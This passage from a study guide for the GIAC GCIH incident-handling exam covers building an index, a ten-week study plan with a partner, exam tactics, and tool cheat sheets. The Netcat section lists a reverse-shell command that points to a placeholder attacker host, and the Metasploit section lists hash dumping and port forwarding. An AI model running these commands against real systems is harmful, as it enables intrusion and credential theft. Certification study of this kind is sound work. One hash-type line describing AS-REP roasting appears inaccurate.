✗ Practice exam questions or answers — GIAC checks for this.
  If found, your certification attempt can be invalidated and
  you can be permanently banned from GIAC certifications.
  Do NOT copy questions. Do NOT write answers to specific
  practice test questions. This is non-negotiable.

✗ Actual exam questions from any source — same consequences.

NOT USEFUL (WASTES SPACE AND SLOWS YOU DOWN):
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
✗ Full paragraphs copied from the books — too long to scan.
  If you need a paragraph, that's what the book is for.

✗ Content you already know cold — every entry you don't need
  makes the entries you DO need harder to find. Ruthlessly
  prune anything you've internalized.

✗ Generic definitions you could figure out from context —
  "TCP: Transmission Control Protocol" adds no exam value.

✗ Motivational quotes, personal notes, study schedule —
  your index is a reference tool, not a journal.

✗ Content from domains that barely appear on the exam —
  if you have 50 entries for one domain and 3 for another,
  rebalance.
```

## 4.12 Don't Use Someone Else's Index

This deserves its own section because the temptation is real. You'll find people sharing GIAC indexes online. You might have a friend who passed GCIH last year and offers you theirs. Don't use it.

Three reasons this fails. First, someone else's index reflects how THEIR brain organizes information. When you search for "lateral movement," they might have indexed it as "pivoting." When you search for "C2," they might have it under "beaconing." Under exam pressure, you'll waste time searching for terms that don't exist in an index you didn't build.

Second, building the index IS the studying. The act of reading each page, deciding what matters, writing it in your own words, and organizing it — that's not busywork. That's the deepest form of active learning. Every entry you write is a rep. Skipping the index is skipping hundreds of reps.

Third, their index may be wrong, outdated, or incomplete. If they took SEC504 two years ago, their index doesn't cover the new AI/LLM domains. If they passed with a 72%, their index had gaps. You won't know where those gaps are until you're in the exam and can't find the answer.

Build your own. The process is the product.

## 4.13 Tools That Help (Without Replacing the Work)

These tools help format and organize your index AFTER you've built it. They do not replace the process of reading the material and writing entries.

- **Voltaire** (training.opensecurity.com) — Online GIAC index builder. Upload your spreadsheet, get a formatted printable output. Good for final formatting.

- **GIAC-Index-Creator** (GitHub: VanAwful/GIAC-Index-Creator) — PowerShell and Python scripts that convert your spreadsheet or CSV into a compact, two-column DOCX formatted for printing. Saves time on print formatting.

- **Google Sheets / Excel** — The standard approach. Free, collaborative (you and your battle buddy can compare indexes), easy to sort and filter. Google Sheets has the advantage of cloud sync so you never lose work.

- **Anki** (flashcard app) — SEC504 includes an Anki deck as bonus content. Use it for spaced repetition alongside your index work. Anki helps retention; the index helps retrieval. They complement each other.

## 4.14 Battle Buddy Index Sessions

Building your indexes separately is fine. But comparing them weekly makes both indexes stronger.

```text
WEEKLY INDEX COMPARISON (15 min per buddy session):
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
1. Pick a domain you both covered this week
2. Each person reads 3-4 of their index entries aloud
3. Compare: did you capture the same concepts?
   - If one of you has an entry the other missed → add it
   - If you described the same concept differently → discuss
     which description is more useful under pressure
   - If you used different keywords for the same thing →
     both of you should add the other's keyword as a synonym

The experienced partner often captures tactical nuance
("detect via Event 4769 with RC4 encryption") that the
junior partner might miss.

The junior partner often captures textbook definitions and
framework steps that the experienced partner skips because
they think they already know it.

Both perspectives make both indexes stronger.
```

---

## Section 5: Study Plan — The 10-Week Battle Buddy Campaign

```text
═══════════════════════════════════════════════════════════════
  This plan assumes you're taking SEC504 (live, online, or 
  OnDemand) with the GCIH attempt bundled. Adjust if 
  self-studying without the course.

  The buddy system works because:
  - Teaching forces understanding
  - Two perspectives catch blind spots
  - Accountability keeps momentum
  - The experienced partner mentors through context
  - The junior partner asks questions the senior takes for granted
═══════════════════════════════════════════════════════════════
```

## 5.1 Phase 1: Course Intake (Weeks 1-4)

### If Attending Live (5-6 days in-person or Live Online)

```text
DURING THE COURSE:
━━━━━━━━━━━━━━━━━
[ ] Take notes ACTIVELY — don't just absorb
[ ] Do every lab. EVERY lab. Including bonus/homework labs.
[ ] Start your index scaffold as you go (Pass 1)
[ ] Write down tool commands and flags during labs
[ ] Ask the instructor questions — this is what you're paying for
[ ] Talk to your battle buddy during breaks about what clicked and
    what didn't
[ ] Keep SANS cheat sheets — you'll bring these to the exam

POST-COURSE (Weeks 2-4 after live course):
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
[ ] Re-read all 5 books. This time, complete your index Pass 1.
[ ] Listen to MP3 audio during commute/gym/dog walks
[ ] Redo every lab from memory (then check against walkthrough)
[ ] Complete the Day 6 CTF if you didn't finish
[ ] Battle buddy check-in: quiz each other on concepts verbally
```

### If Taking OnDemand (4-month access)

```text
WEEKS 1-4 (15-20 hours/week):
━━━━━━━━━━━━━━━━━━━━━━━━━━━━
[ ] Work through 1 book per week (Mon-Fri)
[ ] For each page: read notes, watch video, make index entry
[ ] Complete every lab (including bonus) before moving to next section
[ ] Write out lab steps in your own words (muscle memory)
[ ] Listen to previous day's audio on commute (reinforcement)
[ ] Weekly battle buddy session: review the week's material together

PACING TARGET:
  Book 1 (IR & Investigation):     Week 1
  Book 2 (Recon & Scanning):       Week 2
  Book 3 (Exploitation & Comms):   Week 3
  Book 4 (Post-Exploitation):      Week 3-4
  Book 5 (Advanced Investigations): Week 4
  CTF:                              End of Week 4
```

## 5.2 Phase 2: Index Building & Deepening (Weeks 5-6)

```text
INDEX PASS 2 — ENRICHMENT:
━━━━━━━━━━━━━━━━━━━━━━━━━━
[ ] Complete index Pass 2 (add descriptions to all entries)
[ ] Cross-reference entries with MITRE ATT&CK tactics
[ ] Add tool command syntax for every tool mentioned in labs
[ ] Include synonyms and alternative terms
[ ] Index the SANS cheat sheets (tools, commands, protocols)

LAB REPETITION:
━━━━━━━━━━━━━━
[ ] Redo labs for domains you're weakest in
[ ] For CyberLive prep: practice tool commands WITHOUT the walkthrough
[ ] Battle buddy challenge: give each other a scenario and talk through
    the response steps using PICERL/DAIR

BATTLE BUDDY SESSIONS (2x per week):
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
[ ] Quiz each other on domains
[ ] Walk through attack chains together (recon → exploit → persist → detect)
[ ] Senior partner: explain WHY things work, not just HOW
[ ] Junior partner: ask the "dumb" questions — they're not dumb
```

## 5.3 Phase 3: Practice Test 1 (Week 7)

```text
PRACTICE TEST 1 STRATEGY:
━━━━━━━━━━━━━━━━━━━━━━━━━
BEFORE:
[ ] Print a draft of your index (doesn't need to be final)
[ ] Have all course books ready
[ ] Block 4 uninterrupted hours
[ ] Simulate exam conditions as closely as possible

DURING:
[ ] Use your printed index and books (no Ctrl+F, no Google)
[ ] Track time per question (are you on pace?)
[ ] Flag questions you're unsure about
[ ] Note topics where you couldn't find the answer fast enough

AFTER:
[ ] Review your score breakdown by domain
[ ] GIAC shows correct answers for wrong questions — STUDY THESE
[ ] Do NOT take Practice Test 2 the same day
[ ] Write down every topic you got wrong or guessed on
[ ] Update your index (Pass 3 refinement)
[ ] Share results with battle buddy — compare weak areas
```

## 5.4 Phase 4: Gap Remediation (Weeks 8-9)

```text
TARGETED STUDY:
━━━━━━━━━━━━━━
[ ] Identify your 2-3 weakest domains from Practice Test 1
[ ] Re-read the corresponding course book sections
[ ] Redo labs for those domains
[ ] Add missing content to your index
[ ] Battle buddy: focus sessions on each other's weak domains
    (the senior partner probably has strong tool knowledge but may
     be weak on the new AI/LLM domain; the junior may struggle with
     post-exploitation techniques)

CYBERLIVE PREPARATION:
━━━━━━━━━━━━━━━━━━━━━━
[ ] Practice tool commands in a VM without notes
[ ] Key tools to practice hands-on:
    - Nmap (various scan types, output interpretation)
    - Wireshark (packet capture analysis, display filters)
    - tcpdump (capture filters, reading output)
    - Metasploit (module selection, payload config, session management)
    - Netcat (listeners, reverse shells, file transfers)
    - Hashcat / John (hash identification, cracking)
    - Linux CLI (grep, awk, sed, cut for log analysis)
    - Windows Event Log analysis
    - PowerShell for investigation
```

## 5.5 Phase 5: Practice Test 2 & Final Prep (Week 9-10)

```text
PRACTICE TEST 2 STRATEGY:
━━━━━━━━━━━━━━━━━━━━━━━━━
[ ] Full exam simulation with final index and books
[ ] Strict 4-hour time limit
[ ] If score ≥ 80%, you're ready
[ ] If score 69-79%, focus remaining time on weak domains
[ ] If score < 69%, consider a 45-day extension rather than rushing

FINAL INDEX POLISH:
━━━━━━━━━━━━━━━━━━
[ ] Prune low-value entries
[ ] Ensure every domain has coverage
[ ] Final print: double-sided, spiral bound, tabbed
[ ] Do a speed drill: pick 10 random terms, time yourself finding them

EXAM LOGISTICS:
━━━━━━━━━━━━━━━
[ ] Schedule your exam (don't procrastinate — reschedule fees are real)
[ ] If remote (ProctorU): test your setup, clear your desk, ensure
    quiet environment, have government ID ready
[ ] If onsite (PearsonVUE): know the location, plan for traffic,
    arrive 30 min early
[ ] Pack your materials the night before:
    - Printed index (spiral bound)
    - All course books
    - SANS cheat sheets
    - Any printed notes
    - Government-issued photo ID
    - Water bottle (if permitted)
    - Snacks for break
```

## 5.6 Exam Day

```text
EXAM DAY PROTOCOL:
━━━━━━━━━━━━━━━━━
MORNING:
[ ] Sleep well (seriously — fatigue kills exam performance more than
    any knowledge gap)
[ ] Eat a real meal
[ ] Light review of your index — just browse, don't cram
[ ] Arrive early / log in early

DURING THE EXAM:
[ ] Read each question carefully — GIAC loves "MOST correct" answers
    where multiple options are partially right
[ ] Don't spend more than 3 minutes on any single MC question — flag
    it and come back
[ ] Budget extra time for CyberLive questions (5-8 min each)
[ ] Use your index for facts you're not 100% sure about
[ ] Trust your knowledge first, index second, books third
[ ] Take your break if offered — stretch, hydrate, reset
[ ] Watch for trick questions: "which is NOT..." and "BEST describes..."
    and "FIRST step in..."

COMMON TRAPS:
[ ] Questions about the FIRST thing to do (usually: verify/identify,
    not contain/eradicate)
[ ] Questions asking for a specific tool flag (this is where your index
    of tool syntax pays off)
[ ] Questions with "all of the above" — read every option carefully
[ ] Questions referencing specific MITRE ATT&CK techniques
[ ] Questions about the DIFFERENCE between similar concepts
    (e.g., PtH vs PtT, bind shell vs reverse shell)
```

---

## Section 6: Battle Buddy Methodology — Making Two People Pass

```text
═══════════════════════════════════════════════════════════════
  You have a decade more experience. Your colleague doesn't.
  That asymmetry is a FEATURE, not a bug.
  
  You're not tutoring. You're force-multiplying.
  They ask questions that make YOU think deeper.
  You provide context that makes THEM learn faster.
  Both of you pass.
═══════════════════════════════════════════════════════════════
```

## 6.1 How the Experience Gap Works in Your Favor

The senior partner's advantages: deep contextual understanding of how attacks actually work in the wild, pattern recognition from years of seeing incidents, tooling familiarity, comfort with command-line operations, understanding of network architecture.

The junior partner's advantages: fresh eyes that question assumptions, structured study habits (less likely to skip "easy" sections that actually have exam questions), motivation, and the ability to force the senior to explain things clearly (if you can't explain it simply, you don't understand it well enough).

## 6.2 Weekly Battle Buddy Sessions

```text
FORMAT: 60-90 minutes, 2x per week

SESSION STRUCTURE:
━━━━━━━━━━━━━━━━━
1. Quick check-in (5 min)
   - What did you study this week?
   - What's confusing?

2. Teach-back (20 min each)
   - Each person teaches ONE concept from the week's material
   - The teacher must explain it without looking at notes
   - The listener asks questions and pokes holes

3. Scenario walk-through (20 min)
   - Pick an attack scenario (e.g., "you get an alert for unusual
     SMB traffic at 2am — walk me through your response")
   - Walk through it using PICERL/DAIR
   - Identify which tools you'd use at each step

4. Tool drill (10-15 min)
   - Flash card style: "What Nmap flag does X?"
   - "You need to crack an NTLM hash. Walk me through it."
   - "Write a Wireshark display filter for HTTP POST requests
     to a specific IP."

5. Index review (10 min)
   - Compare index entries for the week's domains
   - Did one of you capture something the other missed?
```

## 6.3 Tailored Focus Areas by Experience Level

### For the Senior Partner (You)

```text
DON'T SKIP THESE JUST BECAUSE YOU "KNOW" THEM:
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
[ ] The IR frameworks (PICERL and DAIR) — you probably DO incident
    response, but do you know the textbook definitions? GIAC tests
    the FRAMEWORK, not just "what would you do?"
[ ] Specific Nmap flag syntax — you use Nmap daily, but do you know
    the difference between -sS, -sT, -sA, -sF, -sX, -sN cold?
[ ] AI/LLM domains — this is NEW content. Your experience doesn't
    help here. Study it like a junior.
[ ] Cloud credential security — if you're not in cloud daily, this
    domain is a potential weak spot.
[ ] Web API attacks (BOLA, BFLA, JWT) — newer attack patterns that
    may not be in your daily ops.
```

### For the Junior Partner (Your Colleague)

```text
INVEST EXTRA TIME IN:
━━━━━━━━━━━━━━━━━━━━
[ ] Post-exploitation and pivoting — this requires understanding
    network architecture and how attackers move laterally. Lean on
    your senior partner to explain the "why" behind each technique.
[ ] Password attacks — understand the relationship between hashes,
    protocols, and tools. Know which attack works against which
    hash type.
[ ] Wireshark/tcpdump — packet analysis is a muscle. Do labs
    repeatedly until reading packet captures feels natural.
[ ] Metasploit — understand the framework architecture (modules,
    payloads, handlers), not just "how to run an exploit."
[ ] Log analysis — practice reading Windows Event Logs and Syslog.
    Know the critical Event IDs cold.
[ ] Build your index LARGER than the senior partner's — you need
    more reference material because you have less in your head.
```

## 6.4 Accountability Framework

```text
WEEKLY COMMITMENTS:
━━━━━━━━━━━━━━━━━━
[ ] Both: complete the week's study plan sections
[ ] Both: update index with the week's content
[ ] Both: attend 2x battle buddy sessions
[ ] Both: complete assigned labs (no skipping)
[ ] Senior: prepare one "teach the concept" topic per session
[ ] Junior: prepare three questions about confusing concepts per session

MILESTONE GATES:
━━━━━━━━━━━━━━━━
Week 4: Both have completed first pass through all course material
Week 6: Both have complete index (Pass 2)
Week 7: Both have taken Practice Test 1
Week 9: Both have taken Practice Test 2
Week 10: Both sit the exam (same week if possible — moral support)
```

---

## Section 7: Critical Tool Reference

These are the tools you MUST be comfortable with for CyberLive and the exam. Know the syntax, not just the concept.

## 7.1 Nmap

```text
SCAN TYPES:
  -sS    SYN scan (half-open, default with root, stealthy)
  -sT    TCP connect scan (full handshake, no root needed)
  -sU    UDP scan (slow, unreliable, but necessary)
  -sA    ACK scan (firewall rule mapping, not port discovery)
  -sF    FIN scan (stealthy, bypasses some firewalls)
  -sX    Xmas scan (FIN+PSH+URG — "lit up like a Christmas tree")
  -sN    NULL scan (no flags set)
  -sV    Version detection (banner grabbing)
  -sC    Default NSE scripts
  -O     OS fingerprinting
  -A     Aggressive (OS + version + scripts + traceroute)
  -Pn    Skip host discovery (treat all hosts as online)
  -p-    Scan all 65535 ports
  --top-ports N   Scan top N most common ports

OUTPUT:
  -oN    Normal output
  -oX    XML output
  -oG    Grepable output
  -oA    All formats

PORT STATES:
  open        Service is accepting connections
  closed      Accessible but no service listening
  filtered    Firewall is dropping packets
  unfiltered  Accessible, but open/closed unknown (ACK scan)
```

## 7.2 Netcat

```text
LISTENER (receive):       nc -lvp 4444
CONNECT (send):           nc <target> 4444
REVERSE SHELL:            nc -e /bin/sh <attacker> 4444
FILE TRANSFER (receive):  nc -lvp 4444 > file.txt
FILE TRANSFER (send):     nc <target> 4444 < file.txt
BANNER GRAB:              nc -v <target> 80
PORT SCAN:                nc -zv <target> 1-1024

REMEMBER:
  Bind shell = listener on TARGET (attacker connects to target)
  Reverse shell = listener on ATTACKER (target connects back)
  Reverse shells bypass firewalls because outbound is usually allowed
```

## 7.3 Wireshark Display Filters

```text
COMMON FILTERS:
  ip.addr == 10.0.0.1            Traffic to/from IP
  ip.src == 10.0.0.1             Traffic from IP
  tcp.port == 443                 TCP port 443
  http.request.method == "POST"   HTTP POST requests
  dns.qry.name contains "evil"   DNS queries containing string
  tcp.flags.syn == 1 && tcp.flags.ack == 0   SYN only (scan detection)
  frame contains "password"       Frames containing string
  tcp.stream eq 5                 Follow TCP stream #5
  !(arp || dns || icmp)           Exclude noise protocols
```

## 7.4 Windows Event IDs to Know Cold

```text
AUTHENTICATION:
  4624    Successful logon
  4625    Failed logon
  4648    Logon using explicit credentials
  4634    Account logoff
  4672    Special privileges assigned (admin logon)

ACCOUNT MANAGEMENT:
  4720    Account created
  4722    Account enabled
  4724    Password reset attempt
  4728/4732/4756  Member added to security group

PROCESS & SERVICE:
  4688    New process created (with command line if audit policy set)
  7045    Service installed
  4697    Service installed (alternate)

SECURITY LOG:
  1102    Audit log cleared (a red flag — who clears logs?)

SYSMON (if installed):
  1       Process creation (with full command line and hashes)
  3       Network connection
  7       Image loaded (DLL)
  11      File created
  13      Registry value set
  22      DNS query
```

## 7.5 Metasploit Quick Reference

```text
FRAMEWORK CONCEPTS:
  Exploit:    Code that takes advantage of a vulnerability
  Payload:    Code that runs after exploitation (what you want to DO)
  Encoder:    Obfuscation for the payload
  Auxiliary:  Scanning, fuzzing, sniffing modules (no exploit)
  Post:       Post-exploitation modules

WORKFLOW:
  search <term>           Find modules
  use <module>            Select a module
  show options            View required settings
  set RHOSTS <target>     Set target
  set LHOST <attacker>    Set listener (for reverse payloads)
  set PAYLOAD <payload>   Set payload
  exploit / run           Execute

METERPRETER COMMANDS:
  sysinfo                 System information
  getuid                  Current user
  hashdump                Dump password hashes
  upload / download       File transfer
  shell                   Drop to system shell
  migrate <PID>           Migrate to another process
  portfwd add -l <lport> -p <rport> -r <target>   Port forward
```

---

## Section 8: Key Frameworks and Models

## 8.1 PICERL — Classic IR Framework

```text
P - Preparation
    Build the team, write the plan, stage tools, practice
    BEFORE an incident happens

I - Identification
    Detect the incident. Triage alerts. Determine scope.
    "Is this actually bad?" → Don't cry wolf.

C - Containment
    Stop the bleeding. Short-term: isolate the system.
    Long-term: patch the vulnerability. Preserve evidence.

E - Eradication
    Remove the attacker's presence. Clean malware.
    Close the vulnerability that allowed access.

R - Recovery
    Restore systems to production. Monitor closely for
    re-compromise. Validate systems are clean.

L - Lessons Learned
    Post-incident review. What happened? What worked?
    What didn't? Update the plan for next time.
```

## 8.2 DAIR — Dynamic Approach to Incident Response

```text
DAIR is the SEC504 / modern approach to IR. More iterative
and action-oriented than the linear PICERL model.

Verify    → Is this real? Confirm the alert is an actual incident.
Scope     → How big is this? What systems, users, data are affected?
Contain   → Stop it from spreading. Isolate, block, disable.
Remediate → Fix the root cause and restore operations.

DAIR is cyclic — you may loop back to Verify/Scope as you
discover new information during containment.
```

## 8.3 MITRE ATT&CK — Know the Tactic Categories

```text
Initial Access     → How the attacker gets in
Execution          → How they run their code
Persistence        → How they stay in the environment
Privilege Escalation → How they get higher access
Defense Evasion    → How they hide
Credential Access  → How they steal credentials
Discovery          → How they map the environment
Lateral Movement   → How they spread
Collection         → How they gather data
Command & Control  → How they communicate
Exfiltration       → How they get data out
Impact             → How they cause damage
```

---

## Section 9: Study Resources Beyond SEC504

## 9.1 Practice and Labs

- **GIAC Practice Tests** (2 included with certification attempt) — essential, non-negotiable
- **SEC504 Labs** — redo them all, especially the ones that were hard
- **TryHackMe** — free/paid rooms for Nmap, Wireshark, Metasploit, IR
- **HackTheBox** — for hands-on exploitation and post-exploitation practice
- **CyberDefenders** — blue team DFIR challenges (log analysis, pcap analysis)
- **Blue Team Labs Online** — incident response and investigation scenarios
- **LetsDefend** — SOC analyst simulation with real alerts
- **Immersive Labs** — if your employer provides access

## 9.2 References

- **SANS SEC504 Cheat Sheets** — bring to the exam
- **SANS DFIR Cheat Sheets** — Windows forensic artifacts, Linux forensics
- **MITRE ATT&CK Navigator** — visual mapping of techniques
- **Lesley Carhart's GIAC Testing Blog Post** (tisiphone.net) — the canonical guide to GIAC exam preparation
- **Ross-Tech Wiki** (for the VCDS people, but applicable pattern) — build your own reference wiki

## 9.3 Audio/Passive Learning

- **SEC504 MP3s** — listen during commute, gym, walks
- **SANS Internet Storm Center (ISC) Daily Podcast** — stay current on threats
- **Darknet Diaries** — real incident stories that reinforce concepts
- **BHIS (Black Hills Information Security) Webcasts** — John Strand's team (SEC504 author connection)

---

## Section 10: Certification Lifecycle

## 10.1 Timeline Management

```text
CERTIFICATION ATTEMPT LIFECYCLE:
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
Day 0:     Attempt activated in GIAC account
Day 1-120: Study window (120 days to sit the exam)
Day 120:   Deadline (unless extended)

EXTENSIONS:
  45-day extension available for a fee
  Max total lifecycle: 570 days
  Don't wait until day 119 to extend — plan ahead

RETAKES:
  30-day mandatory wait between attempts
  Max 3 attempts per year
  Each retake is an additional fee

RESCHEDULING:
  Reschedule early to avoid $175 reseating fee
  Late cancellations and no-shows are expensive
```

## 10.2 Renewal

```text
GCIH RENEWAL:
━━━━━━━━━━━━
  Valid for: 4 years
  Renewal fee: ~$499
  CPE requirement: 36 credits within the 4-year cycle
  Renewal registration opens: 2 years before expiration
  Alternative: retake the current version of the GCIH exam

CPE SOURCES:
  - SANS courses and webcasts
  - Conference attendance
  - Published research or articles
  - Teaching or mentoring
  - Related certifications earned
  - Other approved professional development
```

---

## Section 11: Common Mistakes and How to Avoid Them

```text
MISTAKE: "It's open book, so I don't need to study that hard."
FIX: The questions are DESIGNED for an open-book format. They're
  harder than closed-book questions because they assume you have
  references. If you can't find it in 30 seconds, it might as
  well not exist.

MISTAKE: Skipping the index.
FIX: The index is 60% of your preparation. People who skip it
  consistently score lower. Period.

MISTAKE: Using someone else's index.
FIX: Your brain doesn't search like theirs. Building the index IS
  the study process. Shortcutting it shortcuts the learning.

MISTAKE: Only taking one practice test.
FIX: Take both. Use Practice Test 1 early (Week 7) to find gaps.
  Use Practice Test 2 late (Week 9) to validate fixes.

MISTAKE: Not doing the labs.
FIX: CyberLive doesn't care about your index. It cares about
  whether you can USE THE TOOLS. Lab work is non-negotiable.

MISTAKE: Cramming the week before.
FIX: The 10-week plan exists for a reason. Spaced repetition and
  distributed practice beat cramming every time.

MISTAKE: Ignoring the new AI/LLM domain.
FIX: This is new content that experienced practitioners tend to
  underestimate. It's on the exam. Study it.

MISTAKE: Trying to memorize everything.
FIX: Understand concepts and index facts. Know where to FIND things.
  The exam rewards applied understanding, not rote recall.

MISTAKE: Not reading the FULL question.
FIX: GIAC questions often have "NOT," "BEST," "FIRST," or "MOST"
  as qualifiers. Missing these changes the correct answer entirely.

MISTAKE: Spending too long on hard questions.
FIX: Flag it, move on, come back. You have ~2 minutes per question.
  Burning 5 minutes on one question steals time from three others.
```

---

## Section 12: Quick Reference Cards

## 12.1 Attack Chain → Detection → Response

```text
RECON → SCAN → EXPLOIT → PERSIST → PIVOT → EXFIL
  │        │       │         │        │       │
  ▼        ▼       ▼         ▼        ▼       ▼
OSINT   Nmap    Metasploit  Registry  SSH     DNS
Whois   Masscan Buffer      Sched     RDP     HTTP
DNS     Banner  overflow    tasks     WMI     Encrypted
Google  grab    SQLi/XSS    Services  SMB     channels
                Web app     WMI sub.  PsExec
                API abuse   DLL hijack
  │        │       │         │        │       │
  ▼        ▼       ▼         ▼        ▼       ▼
DETECT: DETECT: DETECT:    DETECT:  DETECT: DETECT:
Web     FW/IDS  IDS/IPS    Registry Logon   NetFlow
logs    logs    App logs   Sysmon   events  DNS logs
DNS     Packet  WAF        Autoruns 4624/   Proxy
logs    capture Event logs File     4625    Data size
                           monitor  4648    anomalies
```

## 12.2 Hash Types Quick Reference

```text
LM Hash:       aad3b435b51404ee (16 bytes, split into 7-byte halves)
NTLM Hash:     32 hex chars, no salt (easy target for rainbow tables)
NTLMv2:        Challenge-response, includes timestamp and server name
Kerberos TGT:  Encrypted with krbtgt key (AS-REP roasting targets this)
Kerberos TGS:  Encrypted with service account key (Kerberoasting)
Linux MD5:     $1$ prefix in /etc/shadow
Linux SHA-256: $5$ prefix
Linux SHA-512: $6$ prefix (most common modern Linux)
bcrypt:        $2b$ or $2a$ prefix (adaptive, slow by design)
```

---
